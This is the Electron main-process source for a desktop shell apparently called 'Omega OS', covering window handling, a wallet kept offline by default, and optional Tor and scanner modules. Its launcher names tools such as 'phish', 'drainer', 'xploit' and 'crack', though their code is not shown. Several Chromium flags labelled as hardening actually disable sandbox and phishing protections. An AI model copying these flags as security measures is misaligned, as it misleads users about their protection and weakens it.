const { app, BrowserWindow, ipcMain, session, dialog, shell, screen, net, clipboard, nativeImage } = require('electron');
const path = require('path');
const os = require('os');
const fs = require('fs');
const OmegaWallet = require('./wallet');
const OmegaIdentityManager = require('./identity-manager');
const CryptoJS = require('crypto-js');
const aiService = require('./ai-service');

// Tor Manager (optional - for bundled Tor)
let torManager;
try {
  torManager = require('./tor-manager');
} catch (e) {
  console.warn('[Main] Tor manager not available:', e.message);
  console.warn('[Main] Tor manager not available:', e.message);
}

// Whisper Service (P2P Messenger)
let whisperService;
try {
  whisperService = require('./whisper-service');

  // Helper to send logs to Whisper window
  const sendWhisperLog = (type, message) => {
    const whisperAppData = Array.from(appWindows.values()).find(w => w.type === 'whisper');
    if (whisperAppData && whisperAppData.window && !whisperAppData.window.isDestroyed()) {
      whisperAppData.window.webContents.send('whisper-log', { type, message, timestamp: Date.now() });
    }
  };

  // Attach logger to Whisper Service
  whisperService.setLogger((type, msg) => {
    console.log(`[Whisper ${type}] ${msg}`); // Keep console log
    sendWhisperLog(type, msg);
  });

  // Attach logger to Tor Manager if available
  if (torManager) {
    torManager.setLogger((type, msg) => {
      // console.log(`[Tor ${type}] ${msg}`); // Reduce noise in main console if needed, or keep it
      sendWhisperLog('tor-' + type, msg);
    });
  }

  // Forward message deletion events to renderer
  whisperService.onMessageDeleted = (messageId) => {
    // Find Whisper window
    const whisperAppData = Array.from(appWindows.values()).find(w => w.type === 'whisper');
    if (whisperAppData && whisperAppData.window && !whisperAppData.window.isDestroyed()) {
      whisperAppData.window.webContents.send('whisper-message-deleted', messageId);
    }
  };
} catch (e) {
  console.warn('[Main] Whisper service not available:', e.message);
}

// Omega Vuln Scanner
let vulnScanner;
try {
  vulnScanner = require('./vuln-scanner');
} catch (e) {
  console.warn('[Main] Vuln scanner not available:', e.message);
}

// Analyitcs (optional - can be disabled)
let analytics;
try {
  analytics = require('./analytics');
} catch (e) {
  console.warn('[Main] Analytics module not available:', e.message);
}

// Try to load integrations manager if it exists
let IntegrationsManager;
try {
  IntegrationsManager = require('./integrations-manager');
} catch (e) {
  // Integrations manager doesn't exist yet, that's ok
}

// Extension Manager
let ExtensionManager;
try {
  ExtensionManager = require('./extension-manager');
} catch (e) {
  console.warn('Extension manager not available:', e.message);
}

// Set app name early for dialogs and window titles
app.setName('Omega OS');

// TOR HARDENING: Chromium command-line flags (must be set before app.whenReady)
// These disable features that can leak IP/fingerprint data even when using Tor
app.commandLine.appendSwitch('disable-webrtc');
app.commandLine.appendSwitch('disable-features', 'NetworkService,NetworkPrediction,PreloadMediaEngagementData,AutofillServerCommunication');
app.commandLine.appendSwitch('disable-background-networking');
app.commandLine.appendSwitch('disable-background-timer-throttling');
app.commandLine.appendSwitch('disable-breakpad');
app.commandLine.appendSwitch('disable-client-side-phishing-detection');
app.commandLine.appendSwitch('disable-component-update');
app.commandLine.appendSwitch('disable-default-apps');
app.commandLine.appendSwitch('disable-domain-reliability');
app.commandLine.appendSwitch('disable-features', 'TranslateUI,BlinkGenPropertyTrees');
app.commandLine.appendSwitch('disable-hang-monitor');
app.commandLine.appendSwitch('disable-ipc-flooding-protection');
app.commandLine.appendSwitch('disable-notifications');
app.commandLine.appendSwitch('disable-offer-store-unmasked-wallet-cards');
app.commandLine.appendSwitch('disable-popup-blocking');
app.commandLine.appendSwitch('disable-print-preview');
app.commandLine.appendSwitch('disable-prompt-on-repost');
app.commandLine.appendSwitch('disable-renderer-backgrounding');
app.commandLine.appendSwitch('disable-setuid-sandbox');
app.commandLine.appendSwitch('disable-speech-api');
app.commandLine.appendSwitch('disable-sync');
app.commandLine.appendSwitch('disable-tab-for-desktop-share');
app.commandLine.appendSwitch('disable-translate');
app.commandLine.appendSwitch('disable-windows10-custom-titlebar');
app.commandLine.appendSwitch('disable-backgrounding-occluded-windows');
app.commandLine.appendSwitch('disable-renderer-backgrounding');
app.commandLine.appendSwitch('disable-features', 'AudioServiceOutOfProcess');
app.commandLine.appendSwitch('disable-spell-checking');
app.commandLine.appendSwitch('disable-remote-fonts');
app.commandLine.appendSwitch('disable-reading-from-canvas');
app.commandLine.appendSwitch('disable-2d-canvas-image-chromium');
app.commandLine.appendSwitch('disable-accelerated-2d-canvas');
app.commandLine.appendSwitch('disable-features', 'SafeBrowsing,PasswordProtectionAPI');
app.commandLine.appendSwitch('metrics-recording-only');
app.commandLine.appendSwitch('disable-features', 'MediaRouter');
// Note: proxy-server will be set dynamically when Tor/VPN is enabled
// host-resolver-rules will be set dynamically to prevent DNS leaks

let desktopWindow; // Main desktop environment window
let appWindows = new Map(); // Track all application windows
let isDev = process.argv.includes('--dev');
let wallet = new OmegaWallet();
let identityManager = new OmegaIdentityManager();
let integrationsManager = IntegrationsManager ? new IntegrationsManager() : null;
let extensionManager = ExtensionManager ? new ExtensionManager() : null;

// Ad Blocker Configuration
let adBlockerEnabled = true; // Default enabled
const AD_TRACKER_DOMAINS = [
  // Common ad networks
  'doubleclick.net', 'googleadservices.com', 'googlesyndication.com',
  'google-analytics.com', 'googletagmanager.com', 'googletagservices.com',
  'facebook.com/tr', 'facebook.net', 'fbcdn.net',
  'amazon-adsystem.com', 'adsystem.amazon.com',
  'advertising.com', 'adnxs.com', 'openx.net', 'pubmatic.com',
  'rubiconproject.com', 'criteo.com', 'outbrain.com', 'taboola.com',
  // Tracking
  'scorecardresearch.com', 'quantserve.com', 'moatads.com',
  'adform.net', 'adtechus.com', 'advertising.com',
  // Common patterns
  '/ads/', '/ad/', '/advertisement', '/banner', '/tracking',
  'ads.', 'ad.', 'tracking.', 'analytics.', 'metrics.'
];

// ISOLATED ENVIRONMENT: All data stored in isolated directory
const ISOLATED_DATA_PATH = path.join(app.getPath('userData'), 'isolated-env');
const ISOLATED_DOCUMENTS_PATH = path.join(ISOLATED_DATA_PATH, 'documents');
const ISOLATED_TRASH_PATH = path.join(ISOLATED_DATA_PATH, 'trash');
const ISOLATED_DESKTOP_PATH = path.join(ISOLATED_DATA_PATH, 'desktop');
if (!fs.existsSync(ISOLATED_DATA_PATH)) {
  fs.mkdirSync(ISOLATED_DATA_PATH, { recursive: true });
}
if (!fs.existsSync(ISOLATED_DOCUMENTS_PATH)) {
  fs.mkdirSync(ISOLATED_DOCUMENTS_PATH, { recursive: true });
}
if (!fs.existsSync(ISOLATED_TRASH_PATH)) {
  fs.mkdirSync(ISOLATED_TRASH_PATH, { recursive: true });
}
if (!fs.existsSync(ISOLATED_DESKTOP_PATH)) {
  fs.mkdirSync(ISOLATED_DESKTOP_PATH, { recursive: true });
}

// SECURITY: Strict session configuration
// Note: File protocol interception disabled - it conflicts with sandbox mode
// File access is already restricted by sandbox mode and context isolation

// VPN/Proxy Configuration
// To use a VPN/proxy, set the OMEGA_PROXY environment variable
// Example: OMEGA_PROXY=socks5://127.0.0.1:1080 npm start
// Or configure a proxy server here:
const PROXY_SERVER = process.env.OMEGA_PROXY || null;

// Helper function to get icon path (works in both dev and packaged app)
function getIconPath() {
  // In packaged app, icon is embedded in executable, but we can still reference it
  // electron-builder puts build/ folder in resources/ directory (outside app.asar)
  const resourcesPath = process.resourcesPath || (app.isPackaged ? path.join(path.dirname(app.getAppPath()), '..') : __dirname);

  // Try multiple possible locations
  const possiblePaths = [
    path.join(resourcesPath, 'build', 'icon.ico'),
    path.join(__dirname, 'build', 'icon.ico'),
    path.join(resourcesPath, 'icon.ico'),
    path.join(__dirname, 'icon.ico'),
  ];

  for (const iconPath of possiblePaths) {
    if (fs.existsSync(iconPath)) {
      return iconPath;
    }
  }

  // Fallback: return the most likely path (electron-builder embeds it in exe, but this is for window icon)
  return path.join(resourcesPath, 'build', 'icon.ico');
}

function createDesktopWindow() {
  desktopWindow = new BrowserWindow({
    width: 1920,
    height: 1080,
    minWidth: 1280,
    minHeight: 720,
    frame: false,
    titleBarStyle: 'hidden',
    backgroundColor: '#1a1a1a',
    fullscreen: false,
    icon: getIconPath(),
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      enableRemoteModule: false,
      preload: path.join(__dirname, 'preload.js'),
      webSecurity: true,
      sandbox: true, // STRICT SANDBOX MODE
      webviewTag: true,
      allowRunningInsecureContent: false,
      experimentalFeatures: false
    },
    show: false
  });

  desktopWindow.loadFile('desktop.html');

  desktopWindow.once('ready-to-show', () => {
    desktopWindow.show();
    // Only show DevTools in development mode
    if (isDev) {
      desktopWindow.webContents.openDevTools();
    }
  });

  // Handle errors
  desktopWindow.webContents.on('did-fail-load', (event, errorCode, errorDescription, validatedURL) => {
    console.error('Failed to load:', errorDescription, validatedURL);
  });

  desktopWindow.on('closed', () => {
    desktopWindow = null;
    // Close all app windows when desktop closes
    appWindows.forEach((win) => win.close());
    appWindows.clear();
  });
}

function createAppWindow(appType, options = {}) {
  // Special handler for Cloudflare Tunnel - opens terminal with script
  if (appType === 'cloudflare-tunnel') {
    const { spawn } = require('child_process');
    const terminalPath = 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe';
    const scriptPath = path.join(__dirname, 'cloudflare-tunnel.js');

    spawn(terminalPath, [
      '-NoExit',
      '-Command',
      `cd '${__dirname}'; node cloudflare-tunnel.js`
    ], {
      detached: true,
      stdio: 'ignore'
    }).unref();

    return null; // Don't create an app window
  }

  let appFile, width, height, loadUrl = null;
  const windowId = Date.now().toString();

  if (appType === 'browser') {
    appFile = 'browser.html';
    width = options.width || 1200;
    height = options.height || 800;
  } else if (appType === 'terminal') {
    appFile = 'terminal.html';
    width = options.width || 1200;
    height = options.height || 800;
  } else if (appType === 'word') {
    appFile = 'word.html';
    width = options.width || 1000;
    height = options.height || 700;
  } else if (appType === 'notes') {
    appFile = 'notes.html';
    width = options.width || 1000;
    height = options.height || 700;
  } else if (appType === 'finance') {
    appFile = 'finance.html';
    width = options.width || 1200;
    height = options.height || 800;
  } else if (appType === 'slides') {
    appFile = 'slides.html';
    width = options.width || 1200;
    height = options.height || 800;
  } else if (appType === 'paint') {
    appFile = 'paint.html';
    width = options.width || 1000;
    height = options.height || 700;
  } else if (appType === 'filemanager') {
    appFile = 'filemanager.html';
    width = options.width || 900;
    height = options.height || 600;
  } else if (appType === 'webapp') {
    // Web app wrapper
    appFile = 'webapp-wrapper.html';
    width = options.width || 1200;
    height = options.height || 800;
    loadUrl = options.url;
  } else if (appType === 'integrations') {
    appFile = 'integrations-manager.html';
    width = options.width || 1000;
    height = options.height || 700;
  } else if (appType === 'encrypt') {
    appFile = 'encrypt.html';
    width = options.width || 800;
    height = options.height || 600;
  } else if (appType === 'hash-verifier') {
    appFile = 'hash-verifier.html';
    width = options.width || 900;
    height = options.height || 800;
  } else if (appType === 'privacy-monitor') {
    appFile = 'privacy-monitor.html';
    width = options.width || 1000;
    height = options.height || 700;
  } else if (appType === 'firewall') {
    appFile = 'firewall.html';
    width = options.width || 900;
    height = options.height || 700;
  } else if (appType === 'calculator') {
    appFile = 'calculator.html';
    width = options.width || 700;
    height = options.height || 800;
  } else if (appType === 'qr-generator') {
    appFile = 'qr-generator.html';
    width = options.width || 900;
    height = options.height || 700;
  } else if (appType === 'calendar') {
    appFile = 'calendar.html';
    width = options.width || 1100;
    height = options.height || 750;
  } else if (appType === 'wallet') {
    appFile = 'wallet.html';
    width = options.width || 600;
    height = options.height || 700;
  } else if (appType === 'identity') {
    appFile = 'identity.html';
    width = options.width || 800;
    height = options.height || 700;
  } else if (appType === 'cookie-manager') {
    appFile = 'cookie-manager.html';
    width = options.width || 1000;
    height = options.height || 700;
  } else if (appType === 'ai-dev') {
    appFile = 'ai-dev.html';
    width = options.width || 1200;
    height = options.height || 800;
  } else if (appType === 'whisper') {
    appFile = 'whisper.html';
    width = options.width || 1100; // Wide enough for sidebar
    height = options.height || 700;
  } else if (appType === 'bazaar') {
    appFile = 'bazaar.html';
    width = options.width || 1000;
    height = options.height || 700;
  } else if (appType === 'netrunner') {
    appFile = 'netrunner.html';
    width = options.width || 1000;
    height = options.height || 700;
  } else if (appType === 'trace') {
    appFile = 'trace.html';
    width = options.width || 900;
    height = options.height || 600;
  } else if (appType === 'xploit') {
    appFile = 'xploit.html';
    width = options.width || 1000;
    height = options.height || 700;
  } else if (appType === 'crack') {
    appFile = 'crack.html';
    width = options.width || 900;
    height = options.height || 600;
  } else if (appType === 'interceptor') {
    appFile = 'interceptor.html';
    width = options.width || 1100;
    height = options.height || 800;
  } else if (appType === 'phish') {
    appFile = 'phish.html';
    width = options.width || 1000;
    height = options.height || 750;
  } else if (appType === 'drainer') {
    appFile = 'drainer.html';
    width = options.width || 900;
    height = options.height || 700;
  } else if (appType === 'vuln') {
    appFile = 'omega-vuln.html';
    width = options.width || 1000;
    height = options.height || 750;
  } else {
    return null;
  }
  // ... (skipping unchanged code) ...



  // Special configuration for wallet (offline/cold storage)
  const isWallet = appType === 'wallet';

  const appWindow = new BrowserWindow({
    width: width,
    height: height,
    minWidth: 800,
    minHeight: 600,
    frame: false,
    titleBarStyle: 'hidden',
    backgroundColor: '#ffffff',
    parent: desktopWindow,
    modal: false,
    skipTaskbar: false,
    icon: getIconPath(),
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      enableRemoteModule: false,
      preload: path.join(__dirname, 'preload.js'),
      webSecurity: true,
      sandbox: true, // STRICT SANDBOX FOR ALL APPS
      webviewTag: !isWallet, // Disable webview for wallet (offline mode)
      // OFFLINE MODE: Disable network access for wallet
      ...(isWallet && {
        partition: 'offline-wallet', // Isolated session with no network
      }),
    },
    show: false,
    // Prevent window thumbnails/previews that might show as black boxes
    transparent: false,
    hasShadow: true,
    // On Windows, ensure proper rendering for thumbnails
    ...(process.platform === 'win32' && {
      skipTaskbar: false,
      autoHideMenuBar: true,
      // Ensure window paints even when hidden (helps with thumbnails)
      paintWhenInitiallyHidden: true
    })
  });

  // Wallet starts in cold storage mode (offline)
  // Network access can be enabled via IPC when user toggles hot wallet mode
  if (isWallet) {
    const walletSession = appWindow.webContents.session;

    // Store network state in window data
    appWindows.set(windowId, {
      window: appWindow,
      type: appType,
      id: windowId,
      snapped: false,
      snapPosition: null,
      walletNetworkEnabled: false // Start with network disabled (cold storage)
    });

    // Block all HTTP/HTTPS requests by default
    walletSession.webRequest.onBeforeRequest((details, callback) => {
      // Allow only file:// protocol for local files
      if (details.url.startsWith('file://')) {
        callback({});
      } else {
        // Check if network is enabled for this wallet window
        const appData = appWindows.get(windowId);
        if (appData && appData.walletNetworkEnabled) {
          callback({});
        } else {
          // Block all other network requests (cold storage mode)
          callback({ cancel: true });
        }
      }
    }, { urls: ['http://*/*', 'https://*/*', 'ws://*/*', 'wss://*/*'] });

    // Disable webview tag completely (always)
    walletSession.setPermissionRequestHandler(() => false);
    walletSession.setPermissionCheckHandler(() => false);
  } else {
    appWindows.set(windowId, {
      window: appWindow,
      type: appType,
      id: windowId,
      snapped: false,
      snapPosition: null
    });
  }

  // Send window ID and file path to renderer
  appWindow.webContents.once('did-finish-load', () => {
    appWindow.webContents.send('app-window-id', windowId);
    if (options.filePath) {
      appWindow.webContents.send('open-file', options.filePath);
    }
    // Send options to wallet if it's for identity registration
    if (appType === 'wallet' && options.forIdentityRegistration) {
      appWindow.webContents.send('wallet-configure-for-identity');
    }
  });

  // Load the app
  if (loadUrl) {
    // For web apps, send URL via IPC after load
    appWindow.webContents.once('did-finish-load', () => {
      appWindow.webContents.send('webapp-url', loadUrl);
    });
    appWindow.loadFile(appFile);
  } else {
    appWindow.loadFile(appFile);
  }

  appWindow.once('ready-to-show', () => {
    if (appType === 'slides') {
      appWindow.maximize();
    }
    appWindow.show();
    // On Windows, ensure window is always ready for thumbnail capture
    if (process.platform === 'win32') {
      // Set initial thumbnail clip to full window
      appWindow.webContents.once('did-finish-load', () => {
        setTimeout(() => {
          if (appWindow && !appWindow.isDestroyed()) {
            const bounds = appWindow.getBounds();
            // Set thumbnail clip immediately after load
            appWindow.setThumbnailClip({ x: 0, y: 0, width: bounds.width, height: bounds.height });
            // Force a repaint
            appWindow.webContents.executeJavaScript('void(document.body.offsetHeight);').catch(() => { });
          }
        }, 200);
      });
    }
    // DevTools disabled - only show in development mode if needed
    // if (appType === 'firewall' && isDev) {
    //   appWindow.webContents.openDevTools();
    // }
  });

  // Window Snapping - Track window movement and snap to edges
  let snapTimeout = null;
  const SNAP_THRESHOLD = 30; // pixels from edge to trigger snap

  appWindow.on('will-move', (event, newBounds) => {
    const appData = appWindows.get(windowId);
    if (appData && appData.snapped) {
      // If window is snapped and user is trying to move, allow unsnap
      appData.snapped = false;
      appData.snapPosition = null;
    }
  });

  // Check for snapping during window movement
  appWindow.on('move', () => {
    if (appWindow.isMaximized()) return;

    const bounds = appWindow.getBounds();
    const primaryDisplay = screen.getPrimaryDisplay();
    const { width: screenWidth, height: screenHeight } = primaryDisplay.workAreaSize;

    const appData = appWindows.get(windowId);
    if (!appData) return;

    // Only apply snap if we're not currently snapped (to avoid conflicts during dragging)
    if (appData.snapped) return;

    let snapPosition = null;

    // Check if near left edge
    if (bounds.x <= SNAP_THRESHOLD && bounds.x >= -10) {
      snapPosition = 'left';
    }
    // Check if near right edge
    else if (bounds.x + bounds.width >= screenWidth - SNAP_THRESHOLD && bounds.x + bounds.width <= screenWidth + 10) {
      snapPosition = 'right';
    }

    // Apply snap immediately when near edge
    if (snapPosition) {
      // Clear any pending timeout
      if (snapTimeout) {
        clearTimeout(snapTimeout);
      }

      // Apply snap after a very short delay to allow dragging to continue smoothly
      snapTimeout = setTimeout(() => {
        const currentBounds = appWindow.getBounds();
        const currentAppData = appWindows.get(windowId);
        if (!currentAppData || currentAppData.snapped || appWindow.isMaximized()) return;

        // Double-check we're still near the edge
        const stillNearLeft = currentBounds.x <= SNAP_THRESHOLD && currentBounds.x >= -10;
        const stillNearRight = currentBounds.x + currentBounds.width >= screenWidth - SNAP_THRESHOLD &&
          currentBounds.x + currentBounds.width <= screenWidth + 10;

        let finalSnapPosition = null;
        if (stillNearLeft) {
          finalSnapPosition = 'left';
        } else if (stillNearRight) {
          finalSnapPosition = 'right';
        }

        if (finalSnapPosition) {
          currentAppData.snapped = true;
          currentAppData.snapPosition = finalSnapPosition;

          let newBounds = {};
          switch (finalSnapPosition) {
            case 'left':
              newBounds = {
                x: 0,
                y: 0,
                width: Math.floor(screenWidth / 2),
                height: Math.floor(screenHeight)
              };
              break;
            case 'right':
              newBounds = {
                x: Math.floor(screenWidth / 2),
                y: 0,
                width: Math.floor(screenWidth / 2),
                height: Math.floor(screenHeight)
              };
              break;
          }

          // Validate bounds before setting - ensure all values are valid integers
          if (newBounds.x !== undefined && newBounds.y !== undefined &&
            newBounds.width > 0 && newBounds.height > 0 &&
            !isNaN(newBounds.x) && !isNaN(newBounds.y) &&
            !isNaN(newBounds.width) && !isNaN(newBounds.height) &&
            isFinite(newBounds.x) && isFinite(newBounds.y) &&
            isFinite(newBounds.width) && isFinite(newBounds.height) &&
            screenWidth > 0 && screenHeight > 0) {
            try {
              // Ensure all values are integers
              const validatedBounds = {
                x: Math.floor(newBounds.x),
                y: Math.floor(newBounds.y),
                width: Math.floor(newBounds.width),
                height: Math.floor(newBounds.height)
              };
              appWindow.setBounds(validatedBounds);
            } catch (error) {
              console.error('Error setting window bounds:', error, newBounds, { screenWidth, screenHeight });
            }
          } else {
            console.error('Invalid bounds - skipping setBounds', { newBounds, screenWidth, screenHeight });
          }
        }
      }, 100); // Small delay to allow dragging
    } else {
      // Not near edge, clear any pending snap
      if (snapTimeout) {
        clearTimeout(snapTimeout);
        snapTimeout = null;
      }
    }
  });

  appWindow.on('closed', () => {
    appWindows.delete(windowId);
    // Notify desktop that window closed
    if (desktopWindow && !desktopWindow.isDestroyed()) {
      desktopWindow.webContents.send('app-window-closed', windowId);
      // Ensure desktop window regains focus and stays visible when child window closes
      desktopWindow.focus();
      if (desktopWindow.isMinimized()) {
        desktopWindow.restore();
      }
      desktopWindow.show();
    }
  });

  return windowId;
}

// IPC Handlers Setup
function setupIPCHandlers() {
  ipcMain.on('desktop-minimize', () => {
    if (desktopWindow) desktopWindow.minimize();
  });

  ipcMain.on('desktop-maximize', () => {
    if (desktopWindow) {
      if (desktopWindow.isMaximized()) {
        desktopWindow.unmaximize();
      } else {
        desktopWindow.maximize();
      }
    }
  });

  ipcMain.on('desktop-close', () => {
    if (desktopWindow) desktopWindow.close();
  });

  ipcMain.handle('desktop-is-maximized', () => {
    return desktopWindow ? desktopWindow.isMaximized() : false;
  });


  ipcMain.handle('app-window-is-maximized', (event, windowId) => {
    const appData = appWindows.get(windowId);
    return appData && appData.window ? appData.window.isMaximized() : false;
  });

  // Launch Application
  ipcMain.handle('launch-app', async (event, appType, options) => {
    // Check license for productivity apps
    const productivityApps = ['word', 'finance', 'slides'];
    if (productivityApps.includes(appType)) {
      try {
        // Initialize provider if wallet is loaded
        if (wallet.isLoaded()) {
          const evmWallet = wallet.getEvmWallet();
          if (evmWallet) {
            await identityManager.initializeProvider(evmWallet);
          }
        }
        const licenseStatus = await identityManager.checkLicense();
        if (!licenseStatus.hasLicense) {
          // Return null to indicate app launch was blocked
          // Frontend will handle showing the error message
          return null;
        }
      } catch (error) {
        console.error('License check failed in main process:', error);
        // If license check fails, block the app for security
        return null;
      }
    }
    return createAppWindow(appType, options);
  });

  ipcMain.handle('get-open-windows', () => {
    const windows = [];
    appWindows.forEach((appData) => {
      windows.push({
        id: appData.id,
        type: appData.type,
        isMaximized: appData.window.isMaximized(),
        isMinimized: appData.window.isMinimized()
      });
    });
    return windows;
  });

  ipcMain.handle('focus-window', (event, windowId) => {
    const appData = appWindows.get(windowId);
    if (appData && appData.window) {
      appData.window.focus();
      if (appData.window.isMinimized()) {
        appData.window.restore();
      }
    }
  });

  ipcMain.handle('minimize-window', (event, windowId) => {
    const appData = appWindows.get(windowId);
    if (appData && appData.window) {
      if (process.platform === 'win32') {
        // CRITICAL FIX: Capture and set thumbnail BEFORE minimizing
        // This ensures Windows has a valid thumbnail to show
        if (!appData.window.isVisible()) {
          appData.window.show();
        }
        appData.window.setOpacity(1);
        appData.window.focus();

        // FORCE WINDOW TO BE FULLY RENDERED BEFORE MINIMIZE
        // This is the most reliable way to prevent black thumbnails
        const ensureRenderedAndMinimize = () => {
          if (!appData.window || appData.window.isDestroyed()) return;

          // Step 1: Ensure window is visible and focused
          appData.window.show();
          appData.window.setOpacity(1);
          appData.window.focus();

          // Step 2: Force multiple paint cycles (5 frames)
          appData.window.webContents.executeJavaScript(`
            new Promise((resolve) => {
              let frameCount = 0;
              function waitForFrames() {
                requestAnimationFrame(() => {
                  frameCount++;
                  if (frameCount >= 5) {
                    // Force layout recalculation multiple times
                    document.body.offsetHeight;
                    document.body.offsetHeight;
                    document.body.offsetHeight;
                    resolve();
                  } else {
                    waitForFrames();
                  }
                });
              }
              waitForFrames();
            });
          `).then(() => {
            // Step 3: Capture page to ensure it's rendered
            return appData.window.webContents.capturePage();
          }).then((image) => {
            if (!appData.window || appData.window.isDestroyed()) return;

            // Step 4: Set thumbnail clip
            const size = image.getSize();
            appData.window.setThumbnailClip({ x: 0, y: 0, width: size.width, height: size.height });

            // Step 5: Wait LONGER for Windows DWM to process thumbnail
            setTimeout(() => {
              if (appData.window && !appData.window.isDestroyed()) {
                appData.window.minimize();
              }
            }, 300); // Increased delay to 300ms
          }).catch(() => {
            // Fallback: minimize with longer delay
            setTimeout(() => {
              if (appData.window && !appData.window.isDestroyed()) {
                appData.window.minimize();
              }
            }, 400);
          });
        };

        // Start the process
        ensureRenderedAndMinimize();
      } else {
        appData.window.minimize();
      }
    }
  });

  // Window Snapping Handlers
  ipcMain.on('app-window-move', (event, windowId, x, y) => {
    const appData = appWindows.get(windowId);
    if (appData && appData.window) {
      const bounds = appData.window.getBounds();
      appData.window.setBounds({ x: x, y: y, width: bounds.width, height: bounds.height });
    }
  });

  ipcMain.on('app-window-snap', (event, windowId, snapPosition) => {
    const appData = appWindows.get(windowId);
    if (appData && appData.window) {
      const screenSize = appData.window.getBounds();
      const primaryDisplay = screen.getPrimaryDisplay();
      const { width: screenWidth, height: screenHeight } = primaryDisplay.workAreaSize;

      let newBounds = {};

      switch (snapPosition) {
        case 'left':
          newBounds = {
            x: 0,
            y: 0,
            width: Math.floor(screenWidth / 2),
            height: Math.floor(screenHeight)
          };
          break;
        case 'right':
          newBounds = {
            x: Math.floor(screenWidth / 2),
            y: 0,
            width: Math.floor(screenWidth / 2),
            height: Math.floor(screenHeight)
          };
          break;
        case 'top':
          newBounds = {
            x: 0,
            y: 0,
            width: Math.floor(screenWidth),
            height: Math.floor(screenHeight / 2)
          };
          break;
        case 'bottom':
          newBounds = {
            x: 0,
            y: Math.floor(screenHeight / 2),
            width: Math.floor(screenWidth),
            height: Math.floor(screenHeight / 2)
          };
          break;
        case 'full':
          newBounds = {
            x: 0,
            y: 0,
            width: Math.floor(screenWidth),
            height: Math.floor(screenHeight)
          };
          break;
        case 'unsnap':
          // Restore to previous size (store this when snapping)
          return;
      }

      // Validate bounds before setting
      if (newBounds.x !== undefined && newBounds.y !== undefined &&
        newBounds.width > 0 && newBounds.height > 0 &&
        !isNaN(newBounds.x) && !isNaN(newBounds.y) &&
        !isNaN(newBounds.width) && !isNaN(newBounds.height) &&
        isFinite(newBounds.x) && isFinite(newBounds.y) &&
        isFinite(newBounds.width) && isFinite(newBounds.height)) {
        try {
          appData.window.setBounds(newBounds);
          appData.snapped = snapPosition !== 'unsnap';
          appData.snapPosition = snapPosition;
        } catch (error) {
          console.error('Error setting window bounds:', error, newBounds);
        }
      }
      appData.snapped = snapPosition !== 'unsnap';
      appData.snapPosition = snapPosition;
    }
  });

  // Multiple Desktops Handlers
  let currentDesktopIndex = 0;
  const desktopWindows = new Map(); // Map of desktop index to window IDs
  desktopWindows.set(0, []); // Initialize desktop 0

  ipcMain.handle('desktop-switch', (event, desktopIndex) => {
    if (desktopIndex < 0) return { success: false, error: 'Invalid desktop index' };

    // Hide windows from current desktop
    const currentWindows = desktopWindows.get(currentDesktopIndex) || [];
    currentWindows.forEach(windowId => {
      const appData = appWindows.get(windowId);
      if (appData && appData.window) {
        appData.window.hide();
      }
    });

    // Show windows for new desktop
    currentDesktopIndex = desktopIndex;
    if (!desktopWindows.has(desktopIndex)) {
      desktopWindows.set(desktopIndex, []);
    }

    const newWindows = desktopWindows.get(desktopIndex) || [];
    newWindows.forEach(windowId => {
      const appData = appWindows.get(windowId);
      if (appData && appData.window) {
        appData.window.show();
      }
    });

    return { success: true, desktopIndex: currentDesktopIndex };
  });

  ipcMain.handle('desktop-create', () => {
    const newIndex = desktopWindows.size;
    desktopWindows.set(newIndex, []);
    return { success: true, desktopIndex: newIndex };
  });

  ipcMain.handle('desktop-get-current', () => {
    return { success: true, desktopIndex: currentDesktopIndex };
  });

  // Track which desktop a window belongs to
  ipcMain.on('app-window-set-desktop', (event, windowId, desktopIndex) => {
    // Remove from current desktop
    desktopWindows.forEach((windows, index) => {
      const idx = windows.indexOf(windowId);
      if (idx > -1) {
        windows.splice(idx, 1);
      }
    });

    // Add to new desktop
    if (!desktopWindows.has(desktopIndex)) {
      desktopWindows.set(desktopIndex, []);
    }
    desktopWindows.get(desktopIndex).push(windowId);

    // Hide/show based on current desktop
    const appData = appWindows.get(windowId);
    if (appData && appData.window) {
      if (desktopIndex === currentDesktopIndex) {
        appData.window.show();
      } else {
        appData.window.hide();
      }
    }
  });

  // Get window ID from sender
  ipcMain.handle('get-window-id', (event) => {
    // Find window by webContents
    for (const [id, appData] of appWindows.entries()) {
      if (appData.window.webContents.id === event.sender.id) {
        return id;
      }
    }
    return null;
  });

  // Auto-detect window ID for app window controls
  ipcMain.on('app-window-minimize', (event, windowId) => {
    let targetWindowId = windowId;
    if (!targetWindowId) {
      // Auto-detect from sender
      for (const [id, appData] of appWindows.entries()) {
        if (appData.window.webContents.id === event.sender.id) {
          targetWindowId = id;
          break;
        }
      }
    }
    const appData = appWindows.get(targetWindowId);
    if (appData && appData.window) {
      if (process.platform === 'win32') {
        // CRITICAL FIX: Capture and set thumbnail BEFORE minimizing
        // This ensures Windows has a valid thumbnail to show
        if (!appData.window.isVisible()) {
          appData.window.show();
        }
        appData.window.setOpacity(1);
        appData.window.focus();

        // FORCE WINDOW TO BE FULLY RENDERED BEFORE MINIMIZE
        // This is the most reliable way to prevent black thumbnails
        const ensureRenderedAndMinimize = () => {
          if (!appData.window || appData.window.isDestroyed()) return;

          // Step 1: Ensure window is visible and focused
          appData.window.show();
          appData.window.setOpacity(1);
          appData.window.focus();

          // Step 2: Force multiple paint cycles (5 frames)
          appData.window.webContents.executeJavaScript(`
            new Promise((resolve) => {
              let frameCount = 0;
              function waitForFrames() {
                requestAnimationFrame(() => {
                  frameCount++;
                  if (frameCount >= 5) {
                    // Force layout recalculation multiple times
                    document.body.offsetHeight;
                    document.body.offsetHeight;
                    document.body.offsetHeight;
                    resolve();
                  } else {
                    waitForFrames();
                  }
                });
              }
              waitForFrames();
            });
          `).then(() => {
            // Step 3: Capture page to ensure it's rendered
            return appData.window.webContents.capturePage();
          }).then((image) => {
            if (!appData.window || appData.window.isDestroyed()) return;

            // Step 4: Set thumbnail clip
            const size = image.getSize();
            appData.window.setThumbnailClip({ x: 0, y: 0, width: size.width, height: size.height });

            // Step 5: Wait LONGER for Windows DWM to process thumbnail
            setTimeout(() => {
              if (appData.window && !appData.window.isDestroyed()) {
                appData.window.minimize();
              }
            }, 300); // Increased delay to 300ms
          }).catch(() => {
            // Fallback: minimize with longer delay
            setTimeout(() => {
              if (appData.window && !appData.window.isDestroyed()) {
                appData.window.minimize();
              }
            }, 400);
          });
        };

        // Start the process
        ensureRenderedAndMinimize();
      } else {
        appData.window.minimize();
      }
    }
  });

  ipcMain.on('app-window-maximize', (event, windowId) => {
